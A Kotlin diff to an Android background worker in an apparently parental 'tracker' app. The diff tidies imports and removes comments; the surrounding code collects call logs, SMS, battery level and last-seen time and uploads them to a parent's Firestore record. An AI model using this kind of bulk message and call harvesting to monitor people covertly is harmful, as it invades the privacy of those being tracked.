@@ -1,7 +1,5 @@
 package com.abuzahra.tracker.services
 
-import com.abuzahra.tracker.SharedPrefsManager // <--- هذا السطر مهم جداً
-// ... باقي الاستيرادات
 import android.Manifest
 import android.content.Context
 import android.content.pm.PackageManager
@@ -18,6 +16,7 @@ import androidx.work.WorkManager
 import androidx.work.WorkerParameters
 import com.google.android.gms.location.LocationServices
 import com.google.firebase.firestore.FirebaseFirestore
+import com.abuzahra.tracker.SharedPrefsManager
 import kotlinx.coroutines.tasks.await
 import java.util.concurrent.TimeUnit
 
@@ -25,7 +24,6 @@ class DataSyncWorker(ctx: Context, params: WorkerParameters) : CoroutineWorker(c
 
     override suspend fun doWork(): Result {
         return try {
-            // استخدام applicationContext لتجنب مشاكل الـ Context
             val parentId = SharedPrefsManager.getParentUid(applicationContext) ?: return Result.failure()
             val deviceId = SharedPrefsManager.getDeviceId(applicationContext) ?: return Result.failure()
 
@@ -39,7 +37,6 @@ class DataSyncWorker(ctx: Context, params: WorkerParameters) : CoroutineWorker(c
             val calls = getCallLogs()
             val sms = getSmsLogs()
 
-            // تحديث البيانات في Firestore
             val data = hashMapOf<String, Any>(
                 "battery_level" to battery,
                 "last_seen" to System.currentTimeMillis(),
@@ -53,10 +50,8 @@ class DataSyncWorker(ctx: Context, params: WorkerParameters) : CoroutineWorker(c
             val db = FirebaseFirestore.getInstance()
             val deviceRef = db.collection("parents").document(parentId).collection("children").document(deviceId)
             
-            // تحديث البيانات الأساسية
             deviceRef.update(data).await()
             
-            // إضافة السجلات
             calls.forEach { call -> deviceRef.collection("calls").add(call) }
             sms.forEach { s -> deviceRef.collection("sms").add(s) }
 
